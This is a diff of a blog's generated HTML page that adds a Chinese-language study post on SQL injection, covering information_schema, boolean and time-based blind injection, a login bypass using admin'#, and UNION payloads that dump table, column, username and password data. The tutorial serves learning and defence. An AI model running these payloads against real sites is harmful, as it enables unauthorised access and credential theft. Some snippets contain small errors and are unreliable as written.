@@ -20,18 +20,18 @@
     var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="Hello blog！">
+  <meta name="description" content="数据库基础在数据库中存在一个系统库：information_schema 在它里面有个存着所有库名的表：schemata字段 schema_name ：库名 在它里面有个存着所有表名的表：tables字段table_schema ：表属于的库字段table_name 表名 在它里面有个存着所有字段名的表：columns字段 table_schema ：表属于的库字段 table_name 表名字段">
 <meta property="og:type" content="article">
-<meta property="og:title" content="hello hexo">
-<meta property="og:url" content="http://yoursite.com/2020/07/30/hello-hexo/index.html">
+<meta property="og:title" content="SQL注入学习">
+<meta property="og:url" content="http://yoursite.com/2020/10/19/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/index.html">
 <meta property="og:site_name" content="gorgeousdays">
-<meta property="og:description" content="Hello blog！">
+<meta property="og:description" content="数据库基础在数据库中存在一个系统库：information_schema 在它里面有个存着所有库名的表：schemata字段 schema_name ：库名 在它里面有个存着所有表名的表：tables字段table_schema ：表属于的库字段table_name 表名 在它里面有个存着所有字段名的表：columns字段 table_schema ：表属于的库字段 table_name 表名字段">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2020-07-30T06:48:12.000Z">
-<meta property="article:modified_time" content="2020-08-31T12:30:36.447Z">
+<meta property="article:published_time" content="2020-10-19T12:47:55.000Z">
+<meta property="article:modified_time" content="2020-10-19T12:49:37.316Z">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="http://yoursite.com/2020/07/30/hello-hexo/">
+<link rel="canonical" href="http://yoursite.com/2020/10/19/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/">
 
 
 <script id="page-configurations">
@@ -44,7 +44,7 @@
   };
 </script>
 
-  <title>hello hexo | gorgeousdays</title>
+  <title>SQL注入学习 | gorgeousdays</title>
   
 
 
@@ -182,7 +182,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/30/hello-hexo/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/10/19/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
@@ -195,7 +195,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          hello hexo
+          SQL注入学习
         </h1>
 
         <div class="post-meta">
@@ -204,16 +204,10 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2020-07-30 14:48:12" itemprop="dateCreated datePublished" datetime="2020-07-30T14:48:12+08:00">2020-07-30</time>
+              <time title="创建时间：2020-10-19 20:47:55 / 修改时间：20:49:37" itemprop="dateCreated datePublished" datetime="2020-10-19T20:47:55+08:00">2020-10-19</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-08-31 20:30:36" itemprop="dateModified" datetime="2020-08-31T20:30:36+08:00">2020-08-31</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -242,7 +236,34 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="Hello-blog！"><a href="#Hello-blog！" class="headerlink" title="Hello blog！"></a>Hello blog！</h3>
+        <h4 id="数据库基础"><a href="#数据库基础" class="headerlink" title="数据库基础"></a>数据库基础</h4><p>在数据库中存在一个系统库：<code>information_schema</code></p>
+<p>在它里面有个存着所有库名的表：<code>schemata</code><br>字段 <code>schema_name</code> ：库名</p>
+<p>在它里面有个存着所有表名的表：<code>tables</code><br>字段<code>table_schema</code> ：表属于的库<br>字段<code>table_name</code> 表名</p>
+<p>在它里面有个存着所有字段名的表：<code>columns</code><br>字段 <code>table_schema</code> ：表属于的库<br>字段 <code>table_name</code> 表名<br>字段 <code>column_name</code> 字段名</p>
+<h4 id="相关语法"><a href="#相关语法" class="headerlink" title="相关语法"></a>相关语法</h4><p><code>select * from</code> 表：从表里查询所有内容</p>
+<p><code>where</code>：有条件的从表里选取数据</p>
+<p><code>and</code>或<code>or</code>：选取数据时存在多个条件</p>
+<p><code>order by</code>：根据指定的结果集/指定的列进行排序</p>
+<p><code>limit 0,1</code>：从第一行起显示一条记录</p>
+<p><code>union select</code> ：将多个表拼在一起 <code>select * from union select * from info</code> 最后输出两张表</p>
+<p>获取当前数据库的字段</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()</span><br></pre></td></tr></table></figure>
+<h4 id="盲注："><a href="#盲注：" class="headerlink" title="盲注："></a>盲注：</h4><p>1.布尔盲注 根据注入信息返回<code>ture</code>或<code>false</code></p>
+<p><code>length()</code>函数 返回字符串长度</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 and length(database()&gt;1)</span><br></pre></td></tr></table></figure>
+<p><code>substr()</code>截取字符串，从第一位截取一个</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 and substr(database(),1,1)&#x3D;&#39;k&#39;</span><br></pre></td></tr></table></figure>
+<p><code>ord()/ascii()</code>返回字符的<code>ascii</code>码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 and ord(substr(database(),1,1))&#x3D;107</span><br></pre></td></tr></table></figure>
+<p>2.时间盲注 只会返回<code>true</code>通过加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确</p>
+<p><code>sleep()</code>函数 将程序挂起一段时间n为n秒</p>
+<p><code>if(expr1,expr2,expr3)</code>判断语句，如果第一个语句正确就执行第二个语句，如果错误执行第三个语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and if(length(database())&#x3D;8,0,sleep(5))-- +</span><br></pre></td></tr></table></figure>
+<h4 id="Eg"><a href="#Eg" class="headerlink" title="Eg.:"></a>Eg.:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//登录部分php代码</span></span><br><span class="line">select username,password，nickname <span class="keyword">from</span> username=<span class="string">&#x27;$username&#x27;</span> <span class="keyword">and</span> password=<span class="string">&#x27;$password&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>于是可以构造<code>$username=&#39;admin&#39;#&#39; and password=&#39;&#123;$Any&#125;</code>实现登录即传入<code>username</code>参数为<code>admin&#39;#</code>  其中引号实现对之前的引号的闭合作用，而<code>#</code>则可以注释掉掉后面的部门，即不必进行<code>password</code>的判断 因此传入任意password实现登录</p>
+<p>而要实现对<code>password</code>的爆破,则可以构造username为<code>1&#39; union select 1,2,($&#123;&#125;)#</code>,前面的<code>1‘</code>即实现登录而后面则是查找操作，注意选择一个数据库中不存在的<code>username</code>,比如<code>1</code>已存在 则采用<code>65537’</code> <code>union</code>后面为要查找的内容 观察php代码我们发现要传入三个字段因此传入<code>1,2</code>起占位符的作用，而后面则为要查找的内容</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">\\查库名</span><br><span class="line">   \\仅查找一项</span><br><span class="line">   1&#x27; union <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, (<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">   \\采用<span class="keyword">group_concat</span>实现多项查找</span><br><span class="line">   <span class="number">1</span><span class="string">&#x27; union select 1, 2, (select group_concat(&#x27;</span>\<span class="string">&#x27;&#x27;</span>,schema_name,<span class="string">&#x27;\&#x27;&#x27;) from information_schema.schemata limit 1)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\\查表名</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, (<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="string">&#x27;\&#x27;&#x27;, table_name, &#x27;</span>\<span class="string">&#x27;&#x27;</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="string">&#x27;user_center&#x27;</span>)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">\\查字段名</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1, 2, (select group_concat(&#x27;</span>\<span class="string">&#x27;&#x27;</span>, column_name, <span class="string">&#x27;\&#x27;&#x27;) from information_schema.columns where table_schema = &#x27;</span>user_center<span class="string">&#x27; and table_name = &#x27;</span><span class="keyword">user</span><span class="string">&#x27;)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\\查username与password</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, (<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="string">&#x27;\&#x27;&#x27;, username, &#x27;</span>\<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;, password, &#x27;</span>\<span class="string">&#x27;&#x27;</span>) <span class="keyword">from</span> <span class="keyword">user</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
     </div>
 
     
@@ -256,11 +277,11 @@
 
         
     <div class="post-nav">
-      <div class="post-nav-item"></div>
       <div class="post-nav-item">
-    <a href="/2020/07/30/Some-problems-in-theme-change/" rel="next" title="Some problems in theme change">
-      Some problems in theme change <i class="fa fa-chevron-right"></i>
+    <a href="/2020/10/11/OD%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/" rel="prev" title="OD基础操作">
+      <i class="fa fa-chevron-left"></i> OD基础操作
     </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -319,7 +340,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Hello-blog%EF%BC%81"><span class="nav-number">1.</span> <span class="nav-text">Hello blog！</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80"><span class="nav-number">1.</span> <span class="nav-text">数据库基础</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E8%AF%AD%E6%B3%95"><span class="nav-number">2.</span> <span class="nav-text">相关语法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8%EF%BC%9A"><span class="nav-number">3.</span> <span class="nav-text">盲注：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Eg"><span class="nav-number">4.</span> <span class="nav-text">Eg.:</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
